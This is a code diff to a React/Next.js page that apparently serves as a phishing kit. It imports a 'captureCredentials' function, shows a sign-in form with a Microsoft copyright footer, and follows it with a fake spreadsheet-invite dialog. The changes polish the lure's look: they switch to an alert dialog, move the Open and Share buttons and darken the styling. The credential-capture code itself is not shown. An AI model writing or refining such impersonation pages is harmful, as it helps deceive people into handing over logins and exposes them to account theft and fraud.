@@ -2,12 +2,14 @@
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogDescription,
-} from '@/components/ui/dialog';
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogAction,
+} from '@/components/ui/alert-dialog';
 import Image from 'next/image';
 
 const SpreadsheetInvite = () => {
@@ -31,9 +33,6 @@ const SpreadsheetInvite = () => {
       <p className="note">
         🔒 This invite will only work for you and people with existing access.
       </p>
-
-      <button className="btn">Open</button>
-      <button className="btn">Share</button>
 
       <footer>
         <div className="footer-logo">
@@ -105,11 +104,16 @@ export default function Home() {
           <small>© Microsoft Corporation</small>
         </form>
       </div>
-      <Dialog open={isSignedIn} onOpenChange={setIsSignedIn}>
-        <DialogContent className="container !max-w-none">
+
+      <AlertDialog open={isSignedIn} onOpenChange={setIsSignedIn}>
+        <AlertDialogContent className="container !max-w-none bg-[#2b2b2b] border-[#3a3a3a]">
           <SpreadsheetInvite />
-        </DialogContent>
-      </Dialog>
+          <AlertDialogFooter>
+            <AlertDialogAction className="btn">Open</AlertDialogAction>
+            <AlertDialogAction className="btn">Share</AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </>
   );
 }
